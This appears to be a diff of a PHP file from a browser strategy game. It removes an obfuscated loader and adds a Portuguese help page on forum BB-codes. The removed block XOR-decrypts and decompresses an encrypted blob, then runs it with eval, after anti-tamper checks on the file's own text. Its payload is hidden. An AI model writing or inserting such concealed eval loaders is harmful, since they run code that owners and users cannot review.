@@ -1,24 +1,356 @@
 <?php
-$wqbprrdkf="20912cf18b11ada0612cb36484c1f1fd";
-$dkxcxdp="06005a55010656555e5102080402575103540605010707070d57000855045455";
-$flbxmlom="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";
-$vnxduaf=file_get_contents(__FILE__);
-$zblzksfoce=str_replace($flbxmlom,"",$vnxduaf);
-if(strpos($zblzksfoce,"ec"."ho")!==false||strpos($zblzksfoce,"pr"."int")!==false||strpos($zblzksfoce,"var_"."dump")!==false||strpos($zblzksfoce,"file_put_"."contents")!==false||strpos($zblzksfoce,"fw"."rite")!==false){die();}
-$bfzwjhxfzfu=str_replace(array($wqbprrdkf,$dkxcxdp),array("SP_be047a6a","KP_866c96b2"),$vnxduaf);
-$sjzrlvaibu=md5($bfzwjhxfzfu);
-$yjibczxe=hex2bin($dkxcxdp);
-$flqqeruag="";
-$dcaqmcgyg=strlen($sjzrlvaibu);
-for($nonentasaz=0;$nonentasaz<$dcaqmcgyg;$nonentasaz++){
-$flqqeruag.=chr(ord($yjibczxe[$nonentasaz])^ord($sjzrlvaibu[$nonentasaz]));
-}
-$klvystcw=base64_decode($flbxmlom);
-$mygozcyaa=strlen($klvystcw);
-$uxfybzy="";
-$zphwdrpj=strlen($flqqeruag);
-for($nonentasaz=0;$nonentasaz<$mygozcyaa;$nonentasaz++){
-$uxfybzy.=$klvystcw[$nonentasaz]^$flqqeruag[$nonentasaz%$zphwdrpj];
-}
-$txtdkeyhc="gzun"."compress";
-eval('?>' . $txtdkeyhc($uxfybzy) . '<?php ');
+// BB Codes Help Content
+?>
+<h1><?= __('help.bb_codes.title', 'BB-Codes') ?></h1>
+<p><?= __('help.bb_codes.intro', 'BB-Codes são códigos especiais usados para formatar textos em mensagens, fóruns de tribo e perfis de jogadores.') ?></p>
+
+<style>
+    .bb-example-row {
+        display: flex;
+        gap: 20px;
+        margin-bottom: 25px;
+        flex-wrap: wrap;
+        border-bottom: 1px solid #cfaa7d;
+        padding-bottom: 15px;
+    }
+    .bb-example-col {
+        flex: 1;
+        min-width: 250px;
+    }
+    .bb-example-col h4 {
+        margin-top: 0;
+        color: #5c0909;
+        margin-bottom: 10px;
+    }
+    .bb-preview-box {
+        background-color: #fff5e1;
+        border: 1px solid #7d510f;
+        padding: 15px;
+        border-radius: 4px;
+        min-height: 50px;
+    }
+    .bb-quote {
+        border-left: 4px solid #7d510f;
+        background-color: #f4ead4;
+        padding: 10px;
+        margin: 5px 0;
+        font-style: italic;
+    }
+    .bb-quote-author {
+        font-weight: bold;
+        color: #5c0909;
+        margin-bottom: 5px;
+        font-style: normal;
+    }
+    .bb-spoiler {
+        border: 1px solid #7d510f;
+        background-color: #f4ead4;
+    }
+    .bb-spoiler-title {
+        background-color: #e2c07c;
+        padding: 5px 10px;
+        font-weight: bold;
+        cursor: pointer;
+        user-select: none;
+    }
+    .bb-spoiler-content {
+        padding: 10px;
+        background-color: #fff5e1;
+    }
+    .bbcodetable {
+        border-collapse: collapse;
+        width: 100%;
+        background-color: #f4ead4;
+        margin: 10px 0;
+    }
+    .bbcodetable th {
+        background-color: #cfaa7d;
+        color: #5c0909;
+        padding: 6px 10px;
+        border: 1px solid #7d510f;
+        text-align: left;
+    }
+    .bbcodetable td {
+        padding: 6px 10px;
+        border: 1px solid #7d510f;
+    }
+</style>
+
+<div class="bb-codes-container">
+
+    <!-- 1. Bold, Italic, Underline, Strikethrough -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>1. <?= __('help.bb_codes.format_title', 'Formatação de Texto (Bold, Italic, Underline, Strikethrough)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[b]Texto em Negrito[/b]
+[i]Texto em Itálico[/i]
+[u]Texto Sublinhado[/u]
+[s]Texto Tachado[/s]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <b>Texto em Negrito</b><br>
+                <i>Texto em Itálico</i><br>
+                <u>Texto Sublinhado</u><br>
+                <s>Texto Tachado</s>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. Colors -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>2. <?= __('help.bb_codes.color_title', 'Cores (Color)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[color=red]Texto Vermelho[/color]
+[color=#0000FF]Texto Azul[/color]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <span style="color: red;">Texto Vermelho</span><br>
+                <span style="color: #0000FF;">Texto Azul</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. Size -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>3. <?= __('help.bb_codes.size_title', 'Tamanho da Fonte (Size)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[size=9]Texto Pequeno[/size]
+[size=18]Texto Grande[/size]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <span style="font-size: 9px;">Texto Pequeno</span><br>
+                <span style="font-size: 18px;">Texto Grande</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. Quotes -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>4. <?= __('help.bb_codes.quote_title', 'Citação (Quote)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[quote=Ice41]Este é um exemplo de citação.[/quote]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box" style="padding: 5px 15px;">
+                <div class="bb-quote">
+                    <div class="bb-quote-author">Ice41 escreveu:</div>
+                    Este é um exemplo de citação.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5. Links -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>5. <?= __('help.bb_codes.link_title', 'Links / URL') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[url]http://www.noblewars.com[/url]
+[url=http://www.noblewars.com]Visitar Jogo[/url]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <a href="#" onclick="return false;">http://www.noblewars.com</a><br>
+                <a href="#" onclick="return false;">Visitar Jogo</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6. Players and Tribes -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>6. <?= __('help.bb_codes.entities_title', 'Jogadores e Tribos') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[player]Ice41[/player]
+[ally]Nobles[/ally]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <a href="#" onclick="return false;"><i class="fas fa-user"></i> Ice41</a><br>
+                <a href="#" onclick="return false;"><i class="fas fa-shield-alt"></i> Nobles</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 7. Coordinates -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>7. <?= __('help.bb_codes.coords_title', 'Coordenadas (Map Link)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[coord]500|500[/coord]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <a href="#" onclick="return false;"><i class="fas fa-map-marker-alt"></i> Aldeia de Bárbaros (500|500) K55</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 8. Spoilers -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>8. <?= __('help.bb_codes.spoiler_title', 'Spoiler') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[spoiler]Este segredo foi revelado![/spoiler]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box" style="padding: 5px 15px;">
+                <details class="bb-spoiler" style="margin: 5px 0;">
+                    <summary class="bb-spoiler-title">Spoiler</summary>
+                    <div class="bb-spoiler-content">
+                        Este segredo foi revelado!
+                    </div>
+                </details>
+            </div>
+        </div>
+    </div>
+
+    <!-- 9. Images -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>9. <?= __('help.bb_codes.img_title', 'Imagens (Image)') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[img]graphic/buildings/main.png[/img]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <img src="graphic/buildings/main.png" alt="Edifício Principal" style="max-height: 40px;">
+            </div>
+        </div>
+    </div>
+
+    <!-- 10. Reports -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>10. <?= __('help.bb_codes.report_title', 'Relatórios') ?></h4>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[report]12ab3c4d[/report]
+[report_display]12ab3c4d[/report_display]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box">
+                <a href="#" onclick="return false;"><i class="fas fa-file-alt"></i> Combat Report (12ab3c4d)</a><br>
+                <small style="color: #666;">(A tag [report_display] carrega o conteúdo completo do relatório diretamente na página do fórum)</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- 11. Buildings -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>11. <?= __('help.bb_codes.building_title', 'Edifícios (Building)') ?></h4>
+            <p style="font-size: 0.9em; margin-bottom: 10px; color: #666;">
+                <?= __('help.bb_codes.building_desc', 'Mostra o ícone gráfico de um edifício do jogo.') ?>
+            </p>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[building]main[/building]
+[building]barracks[/building]
+[building]stable[/building]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box" style="display: flex; gap: 15px; align-items: center; min-height: 50px;">
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/buildings/main.png" alt="Edifício Principal" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>main</span>
+                </div>
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/buildings/barracks.png" alt="Quartel" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>barracks</span>
+                </div>
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/buildings/stable.png" alt="Estábulo" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>stable</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 12. Units -->
+    <div class="bb-example-row">
+        <div class="bb-example-col">
+            <h4>12. <?= __('help.bb_codes.unit_title', 'Unidades (Unit)') ?></h4>
+            <p style="font-size: 0.9em; margin-bottom: 10px; color: #666;">
+                <?= __('help.bb_codes.unit_desc', 'Mostra o ícone gráfico de uma unidade de tropa do jogo.') ?>
+            </p>
+            <pre class="code" style="margin: 0; padding: 10px; background: #222; color: #fff; font-family: monospace;">[unit]spear[/unit]
+[unit]sword[/unit]
+[unit]axe[/unit]</pre>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box" style="display: flex; gap: 15px; align-items: center; min-height: 50px;">
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/unit/unit_spear.png" alt="Lanceiro" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>spear</span>
+                </div>
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/unit/unit_sword.png" alt="Espadachim" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>sword</span>
+                </div>
+                <div style="display: inline-flex; align-items: center; gap: 5px;">
+                    <img src="graphic/unit/unit_axe.png" alt="Bárbaro" style="max-height: 20px;" onerror="this.src='graphic/icons/questionmark.png'">
+                    <span>axe</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 13. Tables -->
+    <div class="bb-example-row" style="border-bottom: none; padding-bottom: 0;">
+        <div class="bb-example-col">
+            <h4>13. <?= __('help.bb_codes.table_title', 'Tabelas (Table)') ?></h4>
+            <p style="font-size: 0.9em; margin-bottom: 10px; color: #666;">
+                <?= __('help.bb_codes.table_desc', 'Permite criar tabelas formatadas. Suporta tanto tags HTML padrão quanto a sintaxe simplificada de colchetes do jogo.') ?>
+            </p>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <div style="flex: 1; min-width: 200px;">
+                    <strong style="font-size: 0.85em; color: #5c0909;">Standard:</strong>
+                    <pre class="code" style="margin: 5px 0 0 0; padding: 8px; background: #222; color: #fff; font-family: monospace; font-size: 0.85em;">[table]
+[tr]
+[th]Header 1[/th]
+[th]Header 2[/th]
+[/tr]
+[tr]
+[td]Cell 1[/td]
+[td]Cell 2[/td]
+[/tr]
+[/table]</pre>
+                </div>
+                <div style="flex: 1; min-width: 200px;">
+                    <strong style="font-size: 0.85em; color: #5c0909;">Shorthand:</strong>
+                    <pre class="code" style="margin: 5px 0 0 0; padding: 8px; background: #222; color: #fff; font-family: monospace; font-size: 0.85em;">[table]
+[**]Header 1[||]Header 2[/**]
+[*]Cell 1[|]Cell 2[/*]
+[/table]</pre>
+                </div>
+            </div>
+        </div>
+        <div class="bb-example-col">
+            <h4><?= __('help.bb_codes.how_it_looks', 'Como Fica:') ?></h4>
+            <div class="bb-preview-box" style="padding: 5px 15px;">
+                <table class="bbcodetable">
+                    <thead>
+                        <tr>
+                            <th>Header 1</th>
+                            <th>Header 2</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Cell 1</td>
+                            <td>Cell 2</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+</div>
